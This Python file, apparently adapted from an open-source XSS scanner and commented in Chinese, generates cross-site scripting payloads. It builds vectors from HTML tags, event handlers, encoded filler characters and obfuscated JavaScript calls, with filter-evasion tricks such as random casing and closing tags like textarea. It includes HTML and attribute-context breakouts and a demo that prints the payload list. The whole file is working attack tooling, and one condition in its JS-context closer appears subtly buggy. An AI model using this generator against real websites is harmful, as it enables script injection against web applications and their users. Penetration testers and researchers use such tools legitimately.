# xss_generator.py
import re
import random
import json
from urllib.parse import urlparse

# --------------------------
# 核心配置 (原core.config)
# --------------------------
xsschecker = 'v3dm0s'
badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
tags = ('html', 'd3v', 'a', 'details')
jFillings = (';',)
lFillings = ('', '%0dx')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')
eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}
functions = (
    '[8].find(confirm)', 'confirm()', '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()'
)

# --------------------------
# JS上下文闭合生成 (原jsContexter)
# --------------------------
def stripper(string, substring, direction='right'):
    done = False
    strippedString = ''
    if direction == 'right':
        string = string[::-1]
    for char in string:
        if char == substring and not done:
            done = True
        else:
            strippedString += char
    if direction == 'right':
        strippedString = strippedString[::-1]
    return strippedString

def jsContexter(script):
    broken = script.split(xsschecker)
    pre = broken[0]
    pre = re.sub(r'(?s)\{.*?\}|\(.*?\)|".*?"|\'.*?\'', '', pre)
    breaker = ''
    num = 0
    for char in pre:
        if char == '{':
            breaker += '}'
        elif char == '(':
            breaker += ';)'
        elif char == '[':
            breaker += ']'
        elif char == '/':
            try:
                if pre[num + 1] == '*':
                    breaker += '/*'
            except IndexError:
                pass
        elif char == '}':
            breaker = stripper(breaker, '}')
        elif char == ')':
            breaker = stripper(breaker, ')')
        elif breaker == ']':
            breaker = stripper(breaker, ']')
        num += 1
    return breaker[::-1]

# --------------------------
# 核心工具函数 (原core.utils)
# --------------------------
def randomUpper(s):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in s)

def extractScripts(response):
    scripts = []
    matches = re.findall(r'(?s)<script.*?>(.*?)</script>', response.lower())
    for match in matches:
        if xsschecker in match:
            scripts.append(match)
    return scripts

def genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None):
    vectors = []
    r = randomUpper
    for tag in tags:
        if tag == 'd3v' or tag == 'a':
            bait = xsschecker
        else:
            bait = ''
        for event in eventHandlers:
            if tag in eventHandlers[event]:
                for func in functions:
                    for fill in fillings:
                        for eFill in eFillings:
                            for lFill in lFillings:
                                for end in ends:
                                    if tag in ['d3v', 'a'] and '>' in ends:
                                        end = '>'
                                    breaker = f'</{r(badTag)}>' if badTag else ''
                                    vector = (
                                        f"{breaker}<{r(tag)}{fill}{r(event)}"
                                        f"{eFill}={eFill}{func}{lFill}{end}{bait}"
                                    )
                                    vectors.append(vector)
    return vectors

# --------------------------
# Payload生成主逻辑 (原generator.py)
# --------------------------
def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = {i: set() for i in range(1, 12)}
    
    for i in occurences:
        ctx = occurences[i]['context']
        details = occurences[i].get('details', {})
        scores = occurences[i]['score']
        
        # HTML上下文处理
        if ctx == 'html':
            if scores.get('>', 0) == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                 eventHandlers, tags, functions, ['>'])
                vectors[10].update(payloads)
        
        # 属性上下文处理
        elif ctx == 'attribute':
            tag = details.get('tag', '')
            quote = details.get('quote', '')
            
            if scores.get('>', 0) == 100 and scores.get(quote, 0) == 100:
                payloads = [f"{quote}>{p}" for p in genGen(fillings, eFillings, lFillings,
                                                         eventHandlers, tags, functions, ['>'])]
                vectors[9].update(payloads)
            
            if details.get('name', '') == 'srcdoc' and scores.get('&lt;', 0):
                payloads = [p.replace('<', '%26lt;') for p in genGen(fillings, eFillings, lFillings,
                                                                   eventHandlers, tags, functions, ['>'])]
                vectors[9].update(payloads)
        
        # 其他上下文类型可根据需要补充...
    
    return vectors

# --------------------------
# 独立运行测试
# --------------------------
if __name__ == "__main__":
    # 示例输入
    test_occurences = {
        0: {
            'context': 'html',
            'score': {'<': 100, '>': 100},
            'details': {'badTag': 'textarea'}
        },
        1: {
            'context': 'attribute',
            'score': {'>': 100, '"': 100},
            'details': {
                'tag': 'img',
                'type': 'value',
                'name': 'src',
                'value': xsschecker,
                'quote': '"'
            }
        }
    }
    
    test_response = """
    <html>
        <script>v3dm0s</script>
        <img src="v3dm0s">
    </html>
    """
    
    # 生成Payload
    results = generator(test_occurences, test_response)
    
    # 格式化输出
    print("Generated XSS Payloads:")
    for level in sorted(results.keys(), reverse=True):
        if results[level]:
            print(f"\n▶ Priority {level} (共 {len(results[level])} 条):")
            for idx, payload in enumerate(results[level], 1):
                print(f"  {idx:02d}. {payload}")

    # 空结果提示
    if not any(results.values()):
        print("⚠ 未生成有效Payload，请检查输入参数！")
